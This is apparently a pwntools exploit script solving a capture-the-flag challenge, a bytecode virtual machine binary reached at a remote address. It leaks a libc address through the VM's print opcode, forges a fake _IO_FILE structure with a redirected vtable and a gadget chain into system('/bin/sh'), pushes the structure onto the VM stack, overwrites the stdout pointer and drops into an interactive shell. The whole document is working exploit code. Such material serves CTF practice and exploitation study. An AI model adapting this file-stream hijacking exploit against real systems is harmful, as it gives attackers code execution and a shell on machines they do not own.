#!/usr/bin/env python3
from pwn import *

exe = ELF("./bytecode")
libc = ELF("/usr/lib64/libc.so.6")
ld = ELF("/usr/lib64/ld-linux-x86-64.so.2")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("172.210.129.230", 1350)
else:
    p = process([exe.path])
    gdb.attach(p, """"

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

def btoa(buffer, element_size=8):
  elements = []
  for i in range(0, len(buffer), element_size):
    elements.append(buffer[i:i + element_size])
  return elements
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
same=b"a"*8
data = b""
add = p8(0)#+b"a"*8
sub = p8(1)#+b"a"*8
div = p8(2)#+b"a"*8
mul = p8(3)#+b"a"*8
ands = p8(4)#+b"a"*8
xor = p8(5)#+b"a"*8
ors = p8(6)#+b"a"*8
push = p8(7)#+8
pop = p8(8)
prt = p8(9)#+data
puts = p8(10)#+b"a"*4
dec = p8(11)#+b"a"*4
inc = p8(12)#+b"a"*4
lea = p8(13)#+16
nop = p8(14)
halt = p8(15)

payload = puts+p32(0x404020)
log.info(f"puts {hex(0x404020)}")
sla(b">>",payload)
p.recvuntil(b" ")
leakaddr = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\0"))
libc.address = leakaddr - libc.sym._IO_2_1_stdout_
system_libc = libc.sym.system
bin_sh = libc.search(b"/bin/sh").__next__()
log.info(f"leaklibc: {hex(leakaddr)}")
log.info(f"base: {hex(libc.address)}")
log.info(f"bin_sh: {hex(bin_sh)}")
log.info(f"system: {hex(system_libc)}")
#########################################start forging
log.info(f"forging vtable for stdout...")
vtable=0x404460
log.info(f"vtable: {hex(vtable)}")
context.clear(arch='amd64')
# some constants
stdout_lock = libc.address + 1984272	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x0000000000163830 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
payload = bytes(fake) +b"paddings"
array = btoa(payload)
################################################## end forging
for i in range(len(array)):
    payload = push+array[len(array)-i-1]
    log.info(f"push {array[len(array)-i-1]}")
    sla(b">>",payload)
# overwrite stdout with forging _IO_FILE
payload = lea+p64(exe.sym.stdout)+p64(exe.sym.stack)
sla(b">>",payload)


p.interactive()
# good luck pwning :)

